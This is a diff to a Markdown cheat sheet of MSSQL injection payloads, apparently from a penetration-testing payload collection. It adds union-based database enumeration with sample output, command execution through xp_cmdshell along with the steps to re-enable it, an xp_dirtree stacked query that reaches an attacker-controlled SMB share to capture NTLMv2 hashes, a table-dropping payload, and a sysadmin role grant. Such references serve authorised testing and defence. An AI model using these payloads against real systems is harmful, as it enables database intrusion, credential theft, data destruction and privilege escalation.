@@ -1,5 +1,12 @@
 # MSSQL Injection
 
+## MSSQL comments
+
+```sql
+-- comment goes here
+/* comment goes here */
+```
+
 ## MSSQL version
 
 ```sql
@@ -50,6 +57,30 @@ SELECT name, password_hash FROM master.sys.sql_logins
 SELECT name + ‘-’ + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
 ```
 
+## MSSQL Union Based
+
+```sql
+-- extract databases names
+$ SELECT name FROM master..sysdatabases
+[*] Injection
+[*] msdb
+[*] tempdb
+
+-- extract tables from Injection database
+$ SELECT name FROM Injection..sysobjects WHERE xtype = 'U'
+[*] Profiles
+[*] Roles
+[*] Users
+
+-- extract columns for the table Users
+$ SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'Users')
+[*] UserId
+[*] UserName
+
+-- Finally extract the data
+$ SELECT  UserId, UserName from Users
+```
+
 ## MSSQL Error based
 
 ```sql
@@ -93,17 +124,25 @@ ProductID=1; DROP members--
 
 ```sql
 EXEC xp_cmdshell "net user";
-EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:'
-EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1'
+EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:';
+EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';
 ```
 
 If you need to reactivate xp_cmdshell (disabled by default in SQL Server 2005)
 
 ```sql
-EXEC sp_configure 'show advanced options',1
-RECONFIGURE
-EXEC sp_configure 'xp_cmdshell',1
-RECONFIGURE
+EXEC sp_configure 'show advanced options',1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell',1;
+RECONFIGURE;
+```
+
+## MSSQL UNC Path
+
+MSSQL supports stacked queries so we can create a variable pointing to our IP address then use the `xp_dirtree` function to list the files in our SMB share and grab the NTLMv2 hash.
+
+```sql
+1'; use master; exec xp_dirtree '\\10.10.15.XX\SHARE';-- 
 ```
 
 ## MSSQL Make user DBA (DB admin)
@@ -112,7 +151,7 @@ RECONFIGURE
 EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin;
 ```
 
-## Thanks to
+## References
 
 * [Pentest Monkey - mssql-sql-injection-cheat-sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
 * [Sqlinjectionwiki - MSSQL](http://www.sqlinjectionwiki.com/categories/1/mssql-sql-injection-cheat-sheet/)
